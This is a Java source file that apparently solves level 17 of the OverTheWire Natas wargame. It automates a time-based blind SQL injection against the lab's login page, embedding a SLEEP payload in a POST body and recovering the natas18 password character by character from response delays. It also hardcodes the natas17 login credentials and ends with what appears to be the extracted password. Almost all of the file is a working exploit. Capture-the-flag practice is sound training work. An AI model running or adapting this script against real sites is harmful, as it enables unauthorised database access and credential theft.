package com.behnam.natas;

import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.http.*;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;
import org.w3c.dom.ls.LSOutput;

import java.time.Duration;

@Component
public class Natas17 {
    public boolean checkPassContain(String pass) {
        long t0= System.currentTimeMillis();
        RestTemplateBuilder restTemplateBuilder = new RestTemplateBuilder();
        restTemplateBuilder.setConnectTimeout(Duration.ofMillis(5));
        RestTemplate restTemplate = restTemplateBuilder.build();
        HttpHeaders headers = new HttpHeaders();
        headers.setBasicAuth("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw");
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        HttpEntity<String> entity = new HttpEntity<String>("username=natas18\" AND IF(BINARY LEFT(password, "+pass.length()+")=\""+pass+"\",SLEEP(10),0);#", headers);
        try {
            ResponseEntity<String> result =
                    restTemplate.exchange("http://natas17.natas.labs.overthewire.org/index.php",
                            HttpMethod.POST, entity, String.class);
            if (System.currentTimeMillis()-t0>=1000)
                return true;
            else
                return false;
        }catch (Exception e){
            e.printStackTrace();
            return true;
        }
    }

    public void solve() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        String password="";
        for (int i=0;i<32;i++) {
            for (char c : chars.toCharArray()) {
                boolean isOk = checkPassContain(password+c);
                if (isOk) {
                    password=password+c;
                    System.out.println(password);
                    break;
                }
            }
        }
    }
}
//xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP